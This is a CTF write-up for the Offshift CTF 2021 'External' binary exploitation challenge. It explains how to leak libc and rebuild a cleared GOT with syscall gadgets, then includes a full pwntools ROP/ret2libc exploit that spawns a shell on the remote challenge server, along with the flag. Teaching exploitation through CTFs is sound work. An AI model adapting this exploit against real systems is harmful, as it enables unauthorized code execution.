@@ -1,0 +1,111 @@
+<!--Add date: 01/30/2021-->
+
+<h1>Offshift CTF 2021 - External</h1>
+
+<h2>Binary Exploitation - 467 pts</h2>
+
+<h3>Writeup by YR81</h3>
+
+<h4>Discussion</h4>
+
+<h5>Program Behavior</h5>
+
+<p>This challenge was rather unique. Let's take a look at what the binary does. It first prints <code>ROP me ;)</code> and reads 0xf0 = 240 characters to a buffer located at <code>rbp - 0x50</code> - clearly, we need to overflow it and craft a ROP chain. However, after the buffer is read, the GOT is cleared!</p>
+
+<img class = "small" src = "./images/os2021_external_1.png">
+
+<p class = "caption">Figure 1. The <code>main()</code> procedure in this challenge.</p>
+
+<p>In a typical ROP exploit, we could just return to a gadget that loads a pointer into <code>rdi</code> and calls a libc function to print an address. However, that won't be possible here since the references to the libc function symbols are destroyed. However, not <i>all</i> of them are gone. We still have access to, for instance, <code>__libc_start_main</code>. Furthermore, we have a <code>write()</code> syscall gadget that can be used to perform arbitrary writes after libc is no longer accessible.</p>
+
+<h5>ROP Exploit</h5>
+
+<p>A first attempt at a payload would be to find a ROP chain that performs <code>execve("/bin/sh", NULL, NULL)</code>. But without any gadgets in libc and the limited gadgets in the program text, this is infeasible. Instead, we will take advantage of the remaining libc references and <i>reconstruct</i> the global offset table (of course with the side effect of leaking libc). We can do this as follows.</p>
+
+<ol>
+    <li><p>Perform syscall <code>write(stdout, __libc_start_main_got, 0x38)</code>. Note that the number of bytes to write (<code>rdx = 0x38</code>) is set in <code>clear_got</code>, which is sufficient (we actually only need 6, at most 8).</p></li>
+    <li><p>Perform syscall <code>read(stdin, puts_got, 0x38)</code>. We will submit the addresses of the libc functions that were deleted.</p></li>
+    <li><p>Return to <code>main()</code>, now functioning correctly with libc references reloaded and knowledge of the libc address.</p></li>
+    <li><p>Proceed with classic ROP-ret2libc exploit.</p></li>
+</ol>
+
+<p>However, there is a slight problem with this approach - there is no way to adjust <code>rax</code> to execute the <code>read()</code> syscall (<code>rax = 0</code>). The return value from the <code>write()</code> syscall should just be 0x38, the number of characters passed via <code>rdx</code>. There are no clear gadgets to adjust <code>rax</code>. This is where intuition - actually, mostly luck - comes in: when there aren't any short gadgets that will do the job, we can look for function gadgets. In this case, consider <code>init_proc()</code> shown below:</p>
+
+<img src = "./images/os2021_external_2.png">
+
+<p class = "caption">Figure 2. A useful gadget that will set <code>rax</code> to 0 to allow for a <code>read()</code> syscall.</p>
+
+<p>It loads a value into <code>rax</code> (promising!) from <code>__gmon_start___ptr</code>. After doing <a href = "https://stackoverflow.com/a/12697864/5740793" target = "_blank">looking around</a> a bit, we learn that this pointer is to a function that initializes gmon profiling - a tool that measures the execution speed of different parts of a program. However, if gmon is not in use (as it probably is not here), then this pointer will be NULL. This is precisely what we need!</p>
+
+<p>After leaking libc, we can recover the addresses of the functions that were cleared from the GOT and safely return to <code>main()</code>, this time with the additional knowledge of where <code>system()</code> and the string <code>/bin/sh</code> are in memory.</p>
+
+<p>A diagram of the initial payload is shown below:</p>
+
+<img class = "small" src = "./images/os2021_external_3.png">
+
+<p class = "caption">Figure 1. First payload.</p>
+
+<h4>Payload</h4>
+
+<pre class = "python">
+
+from pwn import *
+
+ready = True
+debug = False
+
+if ready:
+    p = remote("161.97.176.150", 9999)
+    LIBC = ELF("./libc-2.28.so")
+else:
+    p = process("./external")
+    LIBC = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
+    context.terminal = ["/mnt/c/Users/********/wsl-terminal/open-wsl.exe", "-e"]
+    if debug:
+        gdb.attach(p)
+
+ret = 0x40126f
+poprdi_ret = 0x4012f3
+poprsi_popr15_ret = 0x4012f1
+write_syscall = 0x40127c
+syscall_ret = 0x401283
+main = 0x401224
+init_proc = 0x401004        #sets rax = 0 :) now we can do read syscall
+
+__libc_start_main_got = 0x403fe8
+puts_got = 0x404018
+
+got = ["puts", "setbuf", "printf", "memset", "alarm", "read", "signal"]
+
+p.recvuntil("> ")
+p.send((0x50 * b'\x01' +
+    p64(0xdeadbeef) +
+    p64(poprdi_ret) + p64(1) +
+    p64(poprsi_popr15_ret) + p64(__libc_start_main_got) + p64(0xcafebabe) +
+    p64(write_syscall) +
+    p64(init_proc) +
+    p64(poprdi_ret) + p64(0) +
+    p64(poprsi_popr15_ret) + p64(puts_got) + p64(0xcafebabe) +
+    p64(syscall_ret) +
+    p64(main)).ljust(240, b'\x00'))
+
+LIBC.address = u64(p.recv(8)) - LIBC.sym["__libc_start_main"]
+log.info("Libc base: %s" % (hex(LIBC.address)))
+p.recv(0x30)        #get the rest
+
+p.send(b''.join([p64(LIBC.sym[gota]) for gota in got]).ljust(0x38, b'\x00'))
+
+#return to main, now with knowledge of libc addresses!
+p.recvuntil("> ")
+p.send((0x50 * b'\x01') +
+        p64(0xdeadbeef) +
+        p64(ret) +
+        p64(poprdi_ret) + p64(next(LIBC.search(b"/bin/sh"))) +
+        p64(LIBC.sym["system"]).ljust(240, b'\x00'))
+
+p.interactive()
+</pre>
+
+<h4>Flag</h4>
+
+<p><code>flag{0h_nO_My_G0t!!!!1111!1!}</code></p>
